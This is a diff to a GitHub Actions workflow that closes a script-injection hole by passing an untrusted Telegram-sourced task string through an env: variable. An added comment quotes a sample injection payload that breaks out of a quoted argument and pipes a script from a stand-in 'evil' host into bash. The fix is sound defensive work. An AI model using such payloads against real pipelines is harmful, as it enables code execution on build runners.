@@ -118,9 +118,19 @@ jobs:
         if: steps.poll.outputs.dispatch == 'true'
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          # Routed through env:, not interpolated directly into the script below.
+          # TASK_TEXT comes from a Telegram message — untrusted content, even
+          # though only the allow-listed chat can send it. Direct ${{ }}
+          # interpolation into a run: block is literal text substitution before
+          # bash ever parses it — the classic GitHub Actions script-injection
+          # pattern (a task like `"; curl evil.sh | bash #` would execute on the
+          # runner with this job's actions:write permissions, not just become
+          # task text). env: + "$TASK_TEXT" avoids that; bash does not re-parse
+          # an expanded variable's contents for further substitution.
+          TASK_TEXT: ${{ steps.poll.outputs.task }}
         run: |
           set -euo pipefail
           gh workflow run push-dispatch.yml \
             --ref "${{ github.ref_name }}" \
-            -f task="${{ steps.poll.outputs.task }}"
+            -f task="$TASK_TEXT"
           echo "Dispatched push-dispatch.yml with the task."
